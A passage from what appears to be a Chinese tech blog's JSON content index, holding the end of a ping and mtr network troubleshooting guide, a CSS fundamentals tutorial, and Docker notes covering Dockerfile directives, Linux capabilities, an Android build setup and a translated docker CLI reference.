mtr）\n\n从客户端向目标服务器做 ping 和 mtr 链路测试：\n\n从客户端向目标服务器域名或 IP 做持续的 ping 测试（建议至少 ping 100 个数据包），记录测试结果。\n根据客户端操作系统环境的不同，使用 WinMTR 或 mtr，设置测试目的地址为目标服务器域名或IP，然后进行链路测试，记录测试结果。\n反向链路测试（ping 和 mtr）\n\n进入目标服务器系统内部，做反向 ping 和 mtr 链路测试\n\n从目标服务器向前述步骤 1 获取的客户端 IP做持续的 ping 测试（建议至少 ping 100 个数据包），记录测试结果。\n根据目标服务器操作系统环境的不同，使用 WinMTR 或 mtr，设置测试目的地址为前述步骤 1 获取的客户端 IP，然后进行链路测试，记录测试结果。\n测试结果分析\n\n参阅前述说明，对测试结果进行分析。确认异常节点后，访问 ip.taobao.com 等网站查询、获取相应节点归属运营商及网络。\n\n如果是客户端本地网络相关节点出现异常，则需要对本地网络进行相应排查分析。如果是运营商相关节点出现异常，则需要直接或联系阿里云售后技术支持向相应运营商反馈问题。\n\n工单提交须知\n\n如果问题还未能解决，请记录前述链路测试步骤小节各步骤的测试结果，然后联系售后技术支持。\n\n更多资源\n\ntraceroute(8) - Linux man page： traceroute 工具的 man 帮助。\nWhat is MTR：bitwizard 上关于 mtr 工具的说明。\nWinMTR：WinMTR官方网站。\n\n本文导读目录\n\n本文导读目录\n链路测试工具介绍\nLinux 环境下链路测试工具介绍\nWindows 环境下链路测试工具介绍\n链路测试结果分析简要说明\n网络区域\n链路负载均衡\n结合Avg（平均值）和 StDev（标准偏差）综合判断\nLoss%（丢包率）的判断\n关于延迟\n常见链路异常场景和测试报告\n目标主机网络配置不当\nICMP 限速\n环路\n链路中断\n链路测试步骤\n获取本地网络对应公网 IP\n正向链路测试（ping 和 mtr）\n反向链路测试（ping 和 mtr）\n测试结果分析\n工单提交须知\n更多资源","tags":null},{"location":"//blog.pytool.com/Post/前端技术/Web技术/web技术第七弹 CSS中的重要基础概念","title":"web技术第七弹 CSS中的重要基础概念","text":"web技术第七弹 CSS中的重要基础概念\n\n      学习这些东西，千万不要死记硬背所有的属性，一定要理解一些重要概念，脑子里对这些概念有了直观的认识，就很容易记住有哪些相关的属性。具体写法和属性值的可以随时查询下属性表，写熟了就自动记住了。\nDOM基础概念​\n       一个页面文档，由若干的标签元素以及其内容排列和嵌套而成。如果我们把HTML当成一个根元素，他下面嵌套的每一层标签作为有着层级的各个节点，就形成了一个文档树结构如图：​\n\n       那么，对于这个树里面的一个标签元素，和它平级的元素，是它的兄弟元素；它的直接上一级元素，是它的父元素；它的父元素的上级元素，都是它的祖先元素；它的 直接下级元素，是它的子元素；子元素和子元素的下级，都还它的后代元素。如果我们选定了一个标签，就可以对应出它的这些相关标签元素。\n​ 盒子模型\n       在页面文档里面，每个标签元素+内容，在页面上可以看做是一个盒子（box）模型来显示的。这个盒子的基本模型样子如下：\n\n      从外到内，盒子的层次分别是外边距-边框-内边距-内容，为了方便记忆，英文的首字母连起来是MBPC（我是这么记得：一句咒骂自己电脑的脏话）。\n1、默认的边，从顶部Top开始，顺时针旋转到Left左边。\n2、外边距是无色透明的，每条边只有宽度（width）的概念。外边距的宽度可以是负数，也就是BPC这部分可以从盒子里面移动到外面。在水平方面，两个盒子紧挨着，指的是两个外边距紧贴着；在垂直方面，外边距会被叠加，最终的高度将会是两个高度中数值较大的那个。\n3、边框的四条边有宽度，样式，颜色的属性概念。宽度不能是负值。\n4、内边距的四条边只有宽度的概念，不能是负值。​\n5、一个盒子的背景（background），指的是BPC这一块区域，不包括M的部分。\n6、默认的情况下，css里面显式的指定一个标签元素的宽度width和高度height，在现在的浏览器指的是​C部分内容的宽度和高度。盒子的最终尺寸，需要加上对应的两边MBP的尺寸。但是在IE8以下（又是该死的IE），默认的尺寸相反指的BPC这三部分总共的尺寸。不过在某些情况下，这种方式确实有助于布局，所以在CSS3中可以用元素的box-sizing属性来做重定义。\n7、​盒子如果没有显式的指定高度，则会随着内容的多少自动变化。但如果尺寸是一定的，则可以用overflow属性来设置内容如果超过的话，是直接截断，还是溢出显示，或者自动加上滚动条。\n8、在CSS中，盒子的边框只有矩形，样式（有无边框、粗线虚线等），宽度和颜色的设置。而在CSS3中，增加了新的特性，可以直接设置边框阴影、四个角的弧度，边框也可以设置单独的边框背景图案。​\n9、这些属性的值，可以是auto（浏览器自动计算），具体的px值，或者是百分比（基数是父元素的值），CSS3有一个inheit值，表示继承父元素的对于值。\n10、CSS中基本的盒子模型是块级元素对应的块级盒子，和行内元素对应的行内盒子。块级盒子会自动换行，自上而下的在标准文档流中显示。CSS3则加强和细分了若干种盒子模型，不同的盒子模型定义后会有不同的显示样式。​\nCSS的元素选择器\n       我们知道，CSS样式表是由有多组属性定义组成的，每一组的基本写法是：\n             元素选择器1，元素选择器2， {\n                         属性：属性值；\n                            }​\n      ​ 元素选择器，就是通过一组定义，指定页面文档中对应的标签元素。这个定义可以从元素名、元素DOM结构、元素的属性这几种维度来实现，还有伪类/伪元素两种方式。伪类：指的是在文档中的具有某类特性的元素集合，但并没有为他们定义class属性；伪元素：指的是文档中某些元素的特定部分，但并没有单独用标签标记。CSS3大大增加了伪类/伪元素的相关新属性，可以直接写出更多的以前需要用JS代码才能做出选择的动态元素。\n       1、从元素名称来选择： 如 标签名称 {}​ ； \\#id值 {}；.class值{} {}（是通配符，表示所有的元素）\n       2、从元素DOM结构来选择：\n标签1 标签2 {} 空格表示后代选择器；\n​标签1\u0026gt;标签2 {} \u0026gt;表示子元素选择器；\n标签1+标签2 {} +表示相邻兄弟选择器；\n标签1~标签2 {} ~表示兄弟选择器。\n       3、根据元素的属性来选择：​\n\n      4、伪类、伪元素选择： 写法： 标签名：伪类名 {} ；\n\n       注意，前面五个伪类，通常用来实现鼠标在移动到元素上时候显示样式改变。为了显示效果的正常，记住一个在CSS中设置的顺序，分别是几个伪类的首字母：LVHA。\n5、CSS3中的结构性伪类：这些伪类是根据文本结构来设定的。典型的如CSS中的:first-letter、：first-line。​CSS3新增了更多的结构性伪类，例如 :nth-of-type(odd）/ (even)表示所有奇数/偶数行元素；：root、：empty等。详细可以参考CSS3属性手册。​\n元素的浮动\n      ​ 一个标准文档流的元素排列中，如果一个元素设定了浮动（float）属性，则会发生以下的情况：\n​ 1、该元素如果没有显式的设定尺寸，则会收缩包围住内容，然后从标准文档流中抽出来；\n2、它的父容器如果没有显式设定尺寸，由于它从标准文档流从出来了，就不再需要包裹，父容器会高度塌陷收缩。设置父容器的overflow属性为hidden可以避免这种情况。\n3、该元素从标准文档流中出来后，根据设置的left或者right值，向左或者向右移动，直到紧紧靠着容器的边。同时它的下一个相邻的块级元素，不会再换行，而是在同一行里面靠着它显示。​\n4、如果相邻的元素需要换行显示，可以设置clear属性为both，清除浮动后恢复正常位置。​\n元素的三种定位机制​\n       元素有个重要的属性是定位（position）。默认的值是static，正常文档流定位。还有三种带位移的定位属性值：\n       position：relative； 表示相对位移。这种情况下，元素仍然占据原有的文档流位置；然后根据top和left属性的值，相对原有的文档流位置进行向下和向右的位移；用Z-index属性可以设置产生堆叠的时候显示的顺序。\n       ​position：absolute；表示绝对位移。这种情况下，浏览器会先找到离该元素最近的设置为relative的包裹它的元素位置，如果找不到就以HTML为基准。然后根据top和left的属性值，以基准位置进行向下和向右的位移，Z-index用于设置堆叠显示顺序。所以，通常都会对需要绝对位移的元素设定一个包裹层div，然后对包裹层设定position为relative来做定位基准。\n       position：fixed；表示固定位移。这时候元素会脱离标准文档流，以HTML为基准，根据top和left的属性值，以基准位置进行向下和向右的位移 ，并且是不管浏览器内容如何上下左右滚动，都始终不变。\nCSS属性的继承、覆盖\n      ​ 大部分的和文本相关的属性，可以从父元素直接继承过来。而和盒子模型相关的定位和定位属性是不可直接继承的。覆盖指的是同一个元素的属性，有多个来源做了指定，这时候我们主要记住几点：就优先级别而言，\n1、行内样式指定（尽管不推荐用）\u0026gt;HTML内样式指定\u0026gt;链接外部样式表指定​；\n2、id选择器\u0026gt;class选择器\u0026gt;包含标签名的选择器​；\n​ 3、由于1和2会出现交叉的情况下，2\u0026gt;1 。建议尽量统一都采用外部样式表。\n4、单独设定\u0026gt;继承指定\n\n       ​理解了上述一些概念，这时再来看页面的样式布局和具体元素属性设定，就会轻松很多。下一弹，我们会接着聊：页面布局、文本字体、图案背景、动画变形等CSS属性。","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-01-01 Linux命令 Dockerfile","title":"Linux命令 Dockerfile","text":"---\nhttp://www.cnblogs.com/52fhy/p/5638571.html\ndockerfile 剖析\nENV ENV 的就是给docker来设置变量的. 基本格式为:\nENV name=jimmy age=18\n 修改环境变量\nENV PATH=$PATH:/user/bin\n而通过 ENV 我们就可以完美的告诉docker 从这里开始,你就不能使用cache,自己的重新来.( 因为,每条指令都会生成layer并且有独立的id,一旦你更改的ENV,那么从该指令开始id都会发生改变,也就匹配不到缓存了 )\nARG 指定构建过程中使用的环境变\n\n添加个人信息LABEL\n\n顾名思义,使用 LABEL 就是给你的image打上独一无二的标签.让别人能够了解,这个Image是属于你的. 又或是,用来提醒你自己,这个image现在处于哪一个版本状态.\n\n 设置自己的label\nLABEL owner=\"jimmy\" version=\"0.0.1\"\n在dockerfile定义了默认变量\nARG user=jimy\n 在运行时,进行手动替换\ndocker build --build-arg user=sam -t jimmy/demo .\n\n上面说了ARG和ENV比较类似,不过,里面的区别还是有的. 即, ARG只能用在 docker build 的阶段, 并且不会被保存在 image 中,这就是和ENV的区别.\n\n##############Dockerfile#########################\n容器需要开放SSH 22端口\nEXPOSE 22\n!!!\nENTRYPOINT，表示镜像在初始化时需要执行的命令，不可被重写覆盖，需谨记\nCMD，表示镜像运行默认参数，可被重写覆盖\nENTRYPOINT/CMD都只能在文件中存在一次，并且最后一个生效 多个存在，只有最后一个生效，其它无效！\n需要初始化运行多个命令，彼此之间可以使用 \u0026\u0026 隔开，但最后一个须要为无限运行的命令，需切记！\n\nENTRYPOINT/CMD，一般两者可以配合使用，比如：\n\nENTRYPOINT [\"/usr/sbin/sshd\"]\nCMD [\"-D\"]\n\n在Docker　daemon模式下，无论你是使用ENTRYPOINT，还是CMD，最后的命令，一定要是当前进程需要一直运行的，才能够防容器退出。\n\n以下无效方式：\n\nENTRYPOINT service tomcat7 start 运行几秒钟之后，容器就会退出\nCMD service tomcat7 start #运行几秒钟之后，容器就会退出\n\n这样有效：\n\nENTRYPOINT service tomcat7 start \u0026\u0026 tail -f /var/lib/tomcat7/logs/catalina.out\n或者\nCMD service tomcat7 start \u0026\u0026 tail -f /var/lib/tomcat7/logs/catalina.out\n\n这样也有效：\n\nENTRYPOINT [\"/usr/sbin/sshd\"]\nCMD [\"-D\"]\n\nCapabilities的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAPSYSMODULE表示用户能够加载(或卸载)内核模块的特权操作，而CAPSETUID表示用户能够修改进程用户身份的特权操作。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制。\n    在Capilities中，只有进程和可执行文件才具有能力，每个进程拥有三组能力集，分别称为capeffective, capinheritable, cappermitted(分别简记为:pE,pI,pP)，其中cappermitted表示进程所拥有的最大能力集；capeffective表示进程当前可用的能力集，可以看做是cappermitted的一个子集；而capinheitable则表示进程可以传递给其子进程的能力集。系统根据进程的capeffective能力集进行访问控制，capeffective为cappermitted的子集，进程可以通过取消capeffective中的某些能力来放弃进程的一些特权。可执行文件也拥有三组能力集，对应于进程的三组能力集，分别称为capeffective, capallowed 和 capforced（分别简记为fE,fI,fP），其中，capallowed表示程序运行时可从原进程的capinheritable中集成的能力集，capforced表示运行文件时必须拥有才能完成其服务的能力集；而capeffective则表示文件开始运行时可以使用的能力。\n（一）Linux内核中Capabilities的实现机制\n     Linux内核从2.2版本开始，就加进的Capabilities的概念与机制，并随着版本升高逐步得到改进。在linux中，root权限被分割成一下29中能力：\nCAPCHOWN:修改文件属主的权限\nCAPDACOVERRIDE:忽略文件的DAC访问限制\nCAPDACREADSEARCH:忽略文件读及目录搜索的DAC访问限制\nCAPFOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制\nCAPFSETID:允许设置文件的setuid位\nCAPKILL:允许对不属于自己的进程发送信号\nCAPSETGID:允许改变进程的组ID\nCAPSETUID:允许改变进程的用户ID\nCAPSETPCAP:允许向其他进程转移能力以及删除其他进程的能力\nCAPLINUXIMMUTABLE:允许修改文件的IMMUTABLE和APPEND属性标志\nCAPNETBINDSERVICE:允许绑定到小于1024的端口\nCAPNETBROADCAST:允许网络广播和多播访问\nCAPNETADMIN:允许执行网络管理任务\nCAPNETRAW:允许使用原始套接字\nCAPIPCLOCK:允许锁定共享内存片段\nCAPIPCOWNER:忽略IPC所有权检查\nCAPSYSMODULE:允许插入和删除内核模块\nCAPSYSRAWIO:允许直接访问/devport,/dev/mem,/dev/kmem及原始块设备\nCAPSYSCHROOT:允许使用chroot()系统调用\nCAPSYSPTRACE:允许跟踪任何进程\nCAPSYSPACCT:允许执行进程的BSD式审计\nCAPSYSADMIN:允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等\nCAPSYSBOOT:允许重新启动系统\nCAPSYSNICE:允许提升优先级及设置其他进程的优先级\nCAPSYSRESOURCE:忽略资源限制\nCAPSYSTIME:允许改变系统时钟\nCAPSYSTTYCONFIG:允许配置TTY设备\nCAPMKNOD:允许使用mknod()系统调用\nCAPLEASE:允许修改文件锁的FLLEASE标志\n##########################################################################\ndocker 搭建Android开发环境\ndocker pull ubuntu:10.04\ndocker run -it -p 8080:80 -v /media/ubuntu/sdb2/Android:/mnt -w /mnt ubuntu:10.04 /bin/bash\n\ndocker ps -a\ndocker start 8c055f32bd33\ndocker attach 8c055f32bd33\nsudo vi /etc/apt/source.list\nsed -i 's/httpredir.debian.org/mirrors.aliyun.com/g' /etc/apt/sources.list\n\nsudo sed -i 's/archive.ubuntu.com/mirrors.sohu.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.163.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.aliyuncs.com/g' /etc/apt/sources.list 内网使用\n网易\ndeb http://mirrors.163.com/ubuntu/ lucid main universe restricted multiverse\ndeb-src http://mirrors.163.com/ubuntu/ lucid main universe restricted multiverse\ndeb http://mirrors.163.com/ubuntu/ lucid-security universe main multiverse restricted\ndeb-src http://mirrors.163.com/ubuntu/ lucid-security universe main multiverse restricted\ndeb http://mirrors.163.com/ubuntu/ lucid-updates universe main multiverse restricted\ndeb http://mirrors.163.com/ubuntu/ lucid-proposed universe main multiverse restricted\ndeb-src http://mirrors.163.com/ubuntu/ lucid-proposed universe main multiverse restricted\ndeb http://mirrors.163.com/ubuntu/ lucid-backports universe main multiverse restricted\ndeb-src http://mirrors.163.com/ubuntu/ lucid-backports universe main multiverse restricted\ndeb-src http://mirrors.163.com/ubuntu/ lucid-updates universe main multiverse restricted\nsudo apt-get update\n\nsudo apt-get install gnupg flex bison gperf build-essential \\\n  zip curl zlib1g-dev libc6-dev lib32ncurses5-dev ia32-libs \\\n  x11proto-core-dev libx11-dev lib32readline5-dev lib32z-dev \\\n  libgl1-mesa-dev g++-multilib mingw32 tofrodos python-markdown \\\n  libxml2-utils xsltproc\n\nsudo apt-get install software-properties-common\nsudo apt-get install python-software-properties\n  sudo add-apt-repository ppa:webupd8team/java    添加PPA\n  sudo apt-get update\n  sudo apt-get install oracle-java6-installer     #java-6u45\n\nsudo docker commit -m=\"Android source Complie\" -a=\"rinetd\" ab044db61af2 rinetd/ubuntu:v1\ndocker tag 5db5f8471261 rinetd/ubuntu:devel\ndocker push rinetd/ubuntu\n\nDocker命令参考\n使用方法: docker [OPTIONS] COMMAND [arg...]\n\n一个自给自足的运行时linux容器。\n\n选项:\n  --api-enable-cors=false              在远程的API中启用CORS 头。\n  -b, --bridge=\"\"                      附加容器到一个已经存在的网桥上。如果将该选项的值设置为 'none'，则表示不使用用网桥。\n  --bip=\"\"                             设置网桥的IP地址，使用CIIDR标记方式的地址，不兼容 -b选项。\n  -D, --debug=false                    启用debug 模式。\n  -d, --daemon=false                   启用daemon 模式。\n  --dns=[]                             强制Docker使用特定的DNS 服务器。\n  --dns-search=[]                      强制 Docker使用特定的DNS 搜索域。\n  -e, --exec-driver=\"native\"           强制Docker运行时使用特定的exec驱动。\n  --fixed-cidr=\"\"                      IPv4子网设置掩码(ex: 10.20.0.0/16)，这个子网必须嵌套于网桥子网内(由-b 或者-bip定义)。\n  -G, --group=\"docker\"                 在使用-H运行为守护进程的情况下，设定分配给运行unix套接字的组，如果设置为'' (空字符)，那么将不会设置组。\n  -g, --graph=\"/var/lib/docker\"        设定Docker运行时作为根目录的目录路径。\n  -H, --host=[]                        设置用于在守护进程模式下或者是在客户端模式下连接的套接字，可以是tcp://host:port, unix:///path/to/socket, fd://* or fd://socketfd中的一个或者多。\n  --icc=true                           启用容器间通信。\n  --insecure-registry=[]               对于特定注册启用非安全通信(对于HTTPS没有证书校验，启用HTTP启用fallback) (例如, localhost:5000 or 10.20.0.0/16)。\n  --ip=0.0.0.0                         在容器绑定端口时使用的默认IP地址。\n  --ip-forward=true                    启用net.ipv4.ipforward，也就是开启路由转发功能。\n  --ip-masq=true                       对于网桥的IP段启用ip伪装。\n  --iptables=true                      启用Docker增加的iptables规则。\n  --mtu=0                              设置容器网络的MTU。如果没有提供设置的值：默认将它的值设置为路由器的MTU，如果默认的路由器无效那么就设置为1500。\n  -p, --pidfile=\"/var/run/docker.pid\"  设置守护进程PID文件的路径。\n  --registry-mirror=[]                 指定优先使用的Docker registry镜像。\n  -s, --storage-driver=\"\"              强制Docker运行时使用特定的存储驱动器。\n  --selinux-enabled=false              启用对selinux机制的支持。SELinux目前不支持BTRFS存储驱动器。\n  --storage-opt=[]                     设置存储驱动器选项。\n  --tls=false                          使用TLS，暗示使用tls-verify标志。\n  --tlscacert=\"/root/.docker/ca.pem\"   设置ca证书的路径。远程访问仅信任使用由CA签名的证书。\n  --tlscert=\"/root/.docker/cert.pem\"   设置TLS 证书的路径。\n  --tlskey=\"/root/.docker/key.pem\"     设置TLS key 文件的路径。\n  --tlsverify=false                    使用TLS校验远程登录(daemon:校验客户端, client: 校验守护进程)\n  -v, --version=false                  显示版本信息并退出。\n\n命令:\nattach    附加到一个运行的容器上。\nbuild     从Dockerfile构建镜像。\ncommit    从改变后的容器创建一个新的镜像\ncp        从容器文件系统拷贝文件/目录到宿主机路径。\ncreate    创建一个新的容器。\ndiff      检查容器文件系统的改变。\nevents    从Get real time events from the server\nexec      在已经存在的容器上运行一个命令。\nexport    Stream the contents of a container as a tar archive\nhistory   显示镜像的历史。\nimages    列举镜像。\nimport    从一个tar包的内容创建一个新的文件系统镜像。\ninfo      显示系统层面的信息。\ninspect   查看容器的底层信息。\nkill      杀掉一个正在运行中的容器。\nload      从tar文件中载入一个镜像。\nlogin     注册或者登录到Docker registry 服务器。\nlogout    从Docker registry 服务器退出。\nlogs      获取容器的日志信息。\nport      Lookup the public-facing port that is NAT-ed to PRIVATEPORT\npause     停止容器内所有的进程。\nps        列出容器。\npull      从Docker registry 服务器拉回一个镜像或者一个仓库。\npush      将一个镜像或者一个仓库推向Docker registry 服务器。\nrestart   重新启动一个运行中的容器。\nrm        移除一个或者多个容器。\nrmi       移除一个或者多个镜像。\nrun       在新的容器中运行一个命令。\nsave      将镜像保存为一个tar文档。\nsearch    在Docker Hub上搜索一个镜像。\nstart     启动一个停止的容器。\nstop      S停止一个运行中的容器。\ntag       Tag an image into a repository\ntop       查看容器中运行的进程。\nunpause   取消暂停的容器。\nversion   显示Docker 的版本信息。\nwait      Block until a container stops, then print its exit code\n\ndocker attach\n\n使用方法: docker attach [OPTIONS] CONTAINER\n\n附加到一个正在运行的容器上。\n\n  --no-stdin=false    不附加STDIN。\n  --sig-proxy=true    代理所有接收到的信号到进程(即使是非TTY模式)。SIGCHLD, SIGKILL, 或者 SIGSTOP 不会被代理。\n\ndocker build     \n\n使用方法: docker build [OPTIONS] PATH | URL | -\n\n在指定的PATH源代码下构建新的镜像。\n\n  --force-rm=false     总是立即移除容器，即使是在成功创建之后。\n  --no-cache=false     在构建镜像时不使用缓存。\n  -q, --quiet=false    抑制由容器生成详细输出。\n  --rm=true            成功创建容器之后就立即删除。\n  -t, --tag=\"\"         指定仓库名字(和一个可选的标签)，在构建成功的镜像结果中应用。\n\ndocker commit\n\n使用方法: docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]\n\n从有改变的容器上创建一个新的镜像。\n\n  -a, --author=\"\"     作者 (例如 \"John Hannibal Smith hannibal@a-team.com\"\n  -m, --message=\"\"    提交信息。\n  -p, --pause=true    在提交的过程中暂停容器。\n\ndocker cp   \n\n使用方法: docker cp CONTAINERATH HOSTPATH\n\n从PATH 拷贝文件/目录到 HOSTPATH。\n\ndocker create   \n使用方法: docker create [OPTIONS] IMAGE [COMMAND] [ARG...]\n\n创建一个新容器。\n\n  -a, --attach=[]            附加到STDIN, STDOUT 或者STDERR。\n  --add-host=[]              自定义一个主机到IP的映射(host:ip)。\n  -c, --cpu-shares=0         设定CPU共享(相对权重)。\n  --cap-add=[]               添加Linux capabilities。\n  --cap-drop=[]              移除 Linux capabilities。\n  --cidfile=\"\"               写容器ID的文件。\n  --cpuset=\"\"                设置使用CPU的数量(0-3, 0,1)。\n  --device=[]                添加一个主机设备到容器(例如\n--device=/dev/sdc:/dev/xvdc)\n  --dns=[]                   设置自定义DNS 服务器。\n  --dns-search=[]            设置自定义DNS 搜索域。\n  -e, --env=[]               设置环境变量。\n  --entrypoint=\"\"            覆盖掉镜像中默认的ENTRYPOINT。\n  --env-file=[]              读以逗号分隔的环境变量文件(文件中的行以逗号分隔，每一行都是环境变量)。\n  --expose=[]                将一个没有发布的端口暴露给宿主机。\n  -h, --hostname=\"\"          容器主机名字。\n  -i, --interactive=false    保持 STDIN 打开，即使没有被附加。\n  --link=[]                  以name:alias格式添加连接到其它容器上。\n  --lxc-conf=[]              (lxc exec-driver only) 添加自定义lxc 选项\n--lxc-conf=\"lxc.cgroup.cpuset.cpus = 0,1\"\n  -m, --memory=\"\"            内存限制 (格式: numberoptional unit,\nunit = b, k, m or g)\n  --name=\"\"                  指定容器的名字。\n  --net=\"bridge\"             为容器设置网络模式，\n                               'bridge': 在docker bridge桥上创建一个新的网络栈。\n                                 'none': 该容器没有网络。\n                  'container:name|id': 重新使用其它容器的网络栈。\n                                 'host': 在该容器内使用host网络堆栈。注意：host模式对宿主机上的本地文件系统给定了容器全部的访问权限，包括D-bus，因此容器被认为是不安全的。\n\n  -P, --publish-all=false    发布所有的暴露端口到宿主机接口上。\n  -p, --publish=[]           发布容器的一个端口到宿主机接口上。\n                             格式：\nip:hostPort:containerPort\nip::containerPort\nhostPort:containerPort\ncontainerPort\n                               (使用 'docker port'查看实际的映射)\n  --privileged=false         给这个容器扩展权限。\n  --restart=\"\"               当容器退出时重启策略将会被应用，选项值有：\n(no, on-failure[:max-retry], always)\n  --security-opt=[]          安全选项。\n  -t, --tty=false            分配伪终端。\n  -u, --user=\"\"              用户名或者UID。\n  -v, --volume=[]             绑定挂载卷(例如，从宿主机挂接：-v /host:/container，从Docker挂接：-v /container)\n  --volumes-from=[]          从指定的容器挂载卷。\n  -w, --workdir=\"\"           指定容器内的工作目录。\n\ndocker diff\n\n使用方法: docker diff CONTAINER\n\n查看容器内文件系统的变化。\n\ndocker events     \n\n使用方法: docker events [OPTIONS]\n\n从服务器上获得实时事件。\n  --since=\"\"         从指定的时间戳后显示所有事件。\n  --until=\"\"         流水时间显示到指定的时间为止。\n\ndocker exec   \n\n使用方法: docker exec [OPTIONS] CONTAINER COMMAND [ARG...]\n\n在已经存在的容器内运行一个命令。\n\n  -d, --detach=false         分离模式: 在后台运行\n  -i, --interactive=false    即使没有附加也保持STDIN 打开\n  -t, --tty=false            分配一个伪终端\n\ndocker export   \n\n使用方法: docker export CONTAINER\n\n将文件系统作为一个tar归档文件导出到STDOUT。\n\ndocker info\n\n使用方法: docker info\n\n显示系统级别的信息。\n\ndocker history      \n\n使用方法: docker history [OPTIONS] IMAGE\n\n显示镜像的历史。\n\n  --no-trunc=false     不要截断输出。\n  -q, --quiet=false    只显示数字ID。\n\ndocker images\n\n使用方法: docker images [OPTIONS] [NAME]\n\n列出镜像。\n\n  -a, --all=false      显示所有镜像(默认情况下过滤掉中间层镜像)。\n  -f, --filter=[]      提供过滤值 (例如. 'dangling=true')\n  --no-trunc=false     不要截断输出。\n  -q, --quiet=false    只显示数字ID。\n\ndocker import\n\n使用方法: docker import URL|- [REPOSITORY[:TAG]]\n\n创建一个空的文件系统镜像，并且将压缩包(.tar, .tar.gz, .tgz, .bzip, .tar.xz, .txz)内容输入到其中。\n\ndocker inspect\n\n使用方法: docker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...]\n\n查看容器或者镜像的低级信息。\n\n  -f, --format=\"\"    使用给定的模板格式化输出。\n\ndocker kill\n\n使用方法: docker kill [OPTIONS] CONTAINER [CONTAINER...]\n\n使用SIGKILL杀掉指定的容器。\n\n  -s, --signal=\"KILL\"    向容器发送的信号。\n\ndocker load\n\n使用方法: docker load [OPTIONS]\n\n从STDIN上载入tar包作为镜像。\n\n  -i, --input=\"\"     从tar文件，而不是STDIN读取。\n\ndocker login\n\n使用方法: docker login [OPTIONS] [SERVER]\n\n注册或者登录到一个Docker服务器，如果没有指定服务器，那么https://index.docker.io/v1/将会作为默认值。\n\n  -e, --email=\"\"       邮件\n  -p, --password=\"\"    密码\n  -u, --username=\"\"    用户名\n\ndocker logout\n\n使用方法: docker logout [SERVER]\n\n从一个Docker registry退出，如果没有指定服务器，那么https://index.docker.io/v1/将会作为默认值。\n\ndocker logs  \n\n使用方法: docker logs [OPTIONS] CONTAINER\n\n从容器获取日志。\n\n  -f, --follow=false        跟踪日志输出。\n  -t, --timestamps=false    显示时间戳。\n  --tail=\"all\"              输出日志尾部特定行(默认是所有)。\ndocker port\n\n使用方法: docker port CONTAINER [PRIVATEPORT[/PROTO]]\n\n列出指定的容器的端口映射，或者查找将PRIVATEPORT NAT到面向公众的端口。\n\ndocker pause     \n使用方法: docker pause CONTAINER\n\n暂停容器内所有的进程。\n\ndocker ps   \n\n使用方法: docker ps [OPTIONS]\n\n列出容器。\n\n  -a, --all=false       显示所有的容器。默认情况下仅显示正在运行的容器。\n  --before=\"\"           仅显示在ID或者名字之前的容器，包括没有运行的容器。\n  -f, --filter=[]       提供过滤值. 有效的过滤器:\n                          exited=int - 容器退出的代码 int\n                          status=(restarting|running|paused|exited)\n  -l, --latest=false    仅显示最后一个创建的容器，包括没有运行的。\n  -n=-1                 显示n个最后创建的容器，包括没有运行的。\n  --no-trunc=false      不要截断输出。\n  -q, --quiet=false     仅显示数值ID。\n  -s, --size=false      显示大小。\n  --since=\"\"            仅显示从Id 或者 Name以来的容器，包括没有运行的。\n\ndocker pull      \n\n使用方法: docker pull [OPTIONS] NAME[:TAG]\n\n从registry上拉回一个镜像或者一个容器。\n\n  -a, --all-tags=false    在指定的仓库下载所有标记的镜像。\n\ndocker push     \n\n使用方法: docker push NAME[:TAG]\n\n将一个镜像或者仓库推送到指定的仓库。\n\ndocker restart   \n\n使用方法: docker restart [OPTIONS] CONTAINER [CONTAINER...]\n\n重新启动一个运行中的容器。\n\n  -t, --time=10      在杀掉指定容器之前停动的时间，一旦杀掉容器，那么就会重新启动。默认时间为10秒。\n\ndocker rm            \n\n使用方法: docker rm [OPTIONS] CONTAINER [CONTAINER...]\n\n删除一个或者多个容器。\n\n  -f, --force=false      强制移除一个正在运行的容器(使用 SIGKILL)\n  -l, --link=false       移除指定的连接，而不是潜在的容器。\n  -v, --volumes=false    移除与容器相关的卷。\n\ndocker rmi      \n\n使用方法: docker rmi [OPTIONS] IMAGE [IMAGE...]\n\n移除一个或者多个镜像。\n\n  -f, --force=false    强制移除一个镜像。\n  --no-prune=false     不要删除未标记的父镜像。\n\ndocker run   \n\n使用方法: docker run [OPTIONS] IMAGE [COMMAND] [ARG...]\n\n在新的容器中运行一个命令。\n\n  -a, --attach=[]            附加到STDIN, STDOUT 或者 STDERR。\n  --add-host=[]              添加一个自定义的host-to-IP 映射(host:ip)。\n  -c, --cpu-shares=0         CPU shares (相对权重)。\n  --cap-add=[]               添加Linux capabilities。\n  --cap-drop=[]              放弃 Linux capabilities。\n  --cidfile=\"\"               将容器 ID写入文件。\n  --cpuset=\"\"                允许使用的CPU数量(0-3, 0,1)\n  -d, --detach=false         分离模式：在后台运行容器，并且显示出新容器的ID。\n  --device=[]                向容器添加一个宿主机设备。\n(例如， --device=/dev/sdc:/dev/xvdc)\n  --dns=[]                   设置自定义的DNS 服务器。\n  --dns-search=[]            设置自定义DNS 搜索域。\n  -e, --env=[]               设置环境变量。\n  --entrypoint=\"\"            覆盖掉镜像中默认的ENTRYPOINT。\n  --env-file=[]              读以逗号分隔的环境变量文件(文件中的行以逗号分隔，每一行都是环境变量)。\n  --expose=[]                将一个没有发布的端口暴露给宿主机。\n  -h, --hostname=\"\"          容器主机名字。\n  -i, --interactive=false    保持 STDIN 打开，即使没有被附加。\n  --link=[]                  以name:alias格式添加连接到其它容器上。\n  --lxc-conf=[]              (lxc exec-driver only) 添加自定义lxc 选项\n--lxc-conf=\"lxc.cgroup.cpuset.cpus = 0,1\"\n  -m, --memory=\"\"            内存限制 (格式: numberoptional unit,\nunit = b, k, m or g)\n  --name=\"\"                  指定容器的名字。\n  --net=\"bridge\"             为容器设置网络模式，\n                               